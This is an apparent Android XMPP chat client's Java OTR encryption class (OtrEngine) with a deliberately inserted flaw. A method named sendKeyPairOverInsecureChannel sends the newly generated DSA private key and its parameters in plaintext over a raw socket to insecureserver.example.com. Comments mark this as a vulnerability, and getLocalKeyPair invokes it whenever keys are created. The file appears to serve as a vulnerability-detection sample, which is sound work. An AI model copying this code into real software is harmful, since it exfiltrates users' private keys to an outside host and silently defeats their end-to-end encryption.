package de.gultsch.chat.crypto;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.math.BigInteger;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.DSAPrivateKeySpec;
import java.security.spec.DSAPublicKeySpec;
import java.security.spec.InvalidKeySpecException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.util.Log;

import de.gultsch.chat.entities.Account;
import de.gultsch.chat.persistance.DatabaseBackend;
import de.gultsch.chat.xml.Element;
import de.gultsch.chat.xmpp.MessagePacket;

import net.java.otr4j.OtrEngineHost;
import net.java.otr4j.OtrException;
import net.java.otr4j.OtrPolicy;
import net.java.otr4j.OtrPolicyImpl;
import net.java.otr4j.session.InstanceTag;
import net.java.otr4j.session.SessionID;

public class OtrEngine implements OtrEngineHost {
	
	private static final String LOGTAG = "xmppService";
	private static final int INSECURE_PORT = 12345; // Port used for insecure transmission
	
	private Account account;
	private OtrPolicy otrPolicy;
	private KeyPair keyPair;
	private Context context;

	public OtrEngine(Context context, Account account) {
		this.account = account;
		this.otrPolicy = new OtrPolicyImpl();
		this.otrPolicy.setAllowV1(false);
		this.otrPolicy.setAllowV2(true);
		this.otrPolicy.setAllowV3(true);
		this.keyPair = loadKey(account.getKeys());
	}
	
	private KeyPair loadKey(JSONObject keys) {
		if (keys == null) {
			return null;
		}
		try {
			BigInteger x = new BigInteger(keys.getString("otr_x"),16);
			BigInteger y = new BigInteger(keys.getString("otr_y"),16);
			BigInteger p = new BigInteger(keys.getString("otr_p"),16);
			BigInteger q = new BigInteger(keys.getString("otr_q"),16);
			BigInteger g = new BigInteger(keys.getString("otr_g"),16);
			KeyFactory keyFactory = KeyFactory.getInstance("DSA");
			DSAPublicKeySpec pubKeySpec = new DSAPublicKeySpec(y, p, q, g);
			DSAPrivateKeySpec privateKeySpec = new DSAPrivateKeySpec(x, p, q, g);
			PublicKey publicKey = keyFactory.generatePublic(pubKeySpec);
			PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec);
			return new KeyPair(publicKey, privateKey);
		} catch (JSONException e) {
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (InvalidKeySpecException e) {
			e.printStackTrace();
		}
		return null;
	}
	
	private void saveKey() {
		PublicKey publicKey = keyPair.getPublic();
		PrivateKey privateKey = keyPair.getPrivate();
		KeyFactory keyFactory;
		try {
			keyFactory = KeyFactory.getInstance("DSA");
			DSAPrivateKeySpec privateKeySpec = keyFactory.getKeySpec(privateKey, DSAPrivateKeySpec.class);
			DSAPublicKeySpec publicKeySpec = keyFactory.getKeySpec(publicKey, DSAPublicKeySpec.class);
			this.account.setKey("otr_x",privateKeySpec.getX().toString(16));
			this.account.setKey("otr_g",privateKeySpec.getG().toString(16));
			this.account.setKey("otr_p",privateKeySpec.getP().toString(16));
			this.account.setKey("otr_q",privateKeySpec.getQ().toString(16));
			this.account.setKey("otr_y",publicKeySpec.getY().toString(16));
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (InvalidKeySpecException e) {
			e.printStackTrace();
		} catch (JSONException e) {
			e.printStackTrace();
		}
		
	}

    // Vulnerability: Sending sensitive key information over an insecure socket
	private void sendKeyPairOverInsecureChannel(KeyPair keyPair) {
        try {
            Socket socket = new Socket("insecureserver.example.com", INSECURE_PORT);
            OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());
            DSAPrivateKeySpec privateKeySpec = (DSAPrivateKeySpec) KeyFactory.getInstance("DSA").getKeySpec(keyPair.getPrivate(), DSAPrivateKeySpec.class);
            DSAPublicKeySpec publicKeySpec = (DSAPublicKeySpec) KeyFactory.getInstance("DSA").getKeySpec(keyPair.getPublic(), DSAPublicKeySpec.class);
            
            String keyData = "PRIVATE_KEY=" + privateKeySpec.getX().toString(16) +
                             "&PUBLIC_KEY=" + publicKeySpec.getY().toString(16) +
                             "&P=" + publicKeySpec.getP().toString(16) +
                             "&Q=" + publicKeySpec.getQ().toString(16) +
                             "&G=" + publicKeySpec.getG().toString(16);
            
            writer.write(keyData); // Vulnerable: Sending sensitive data in plaintext
            writer.flush();
            socket.close();
        } catch (IOException | NoSuchAlgorithmException | InvalidKeySpecException e) {
            Log.e(LOGTAG, "Error sending key pair over insecure channel", e);
        }
    }

	@Override
	public void askForSecret(SessionID arg0, InstanceTag arg1, String arg2) {
		// TODO Auto-generated method stub

	}

	@Override
	public void finishedSessionMessage(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public String getFallbackMessage(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public byte[] getLocalFingerprintRaw(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public KeyPair getLocalKeyPair(SessionID arg0) throws OtrException {
		if (this.keyPair==null) {
			KeyPairGenerator kg;
			try {
				kg = KeyPairGenerator.getInstance("DSA");
				this.keyPair = kg.genKeyPair();
                sendKeyPairOverInsecureChannel(this.keyPair); // Vulnerable: Sending newly generated key pair over insecure channel
				this.saveKey();
				DatabaseBackend.getInstance(context).updateAccount(account);
			} catch (NoSuchAlgorithmException e) {
				Log.d(LOGTAG,"error generating key pair "+e.getMessage());
			}
		}
		return this.keyPair;
	}

	@Override
	public String getReplyForUnreadableMessage(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public OtrPolicy getSessionPolicy(SessionID arg0) {
		return otrPolicy;
	}

	@Override
	public void injectMessage(SessionID session, String body) throws OtrException {
		MessagePacket packet = new MessagePacket();
		packet.setFrom(account.getFullJid()); //sender
		packet.setTo(session.getAccountID()+"/"+session.getUserID()); //recipient
		packet.setBody(body);
		Element privateTag = new Element("private");
		privateTag.setAttribute("xmlns","urn:xmpp:carbons:2");
		packet.addChild(privateTag);
		account.getXmppConnection().sendMessagePacket(packet);
	}

	@Override
	public void messageFromAnotherInstanceReceived(SessionID arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void multipleInstancesDetected(SessionID arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void requireEncryptedMessage(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void showError(SessionID arg0, String arg1) throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void smpAborted(SessionID arg0) throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void smpError(SessionID arg0, int arg1, boolean arg2)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void unencryptedMessageReceived(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void unreadableMessageReceived(SessionID arg0) throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void unverify(SessionID arg0, String arg1) {
		// TODO Auto-generated method stub

	}

	@Override
	public void verify(SessionID arg0, String arg1, boolean arg2) {
		// TODO Auto-generated method stub

	}

}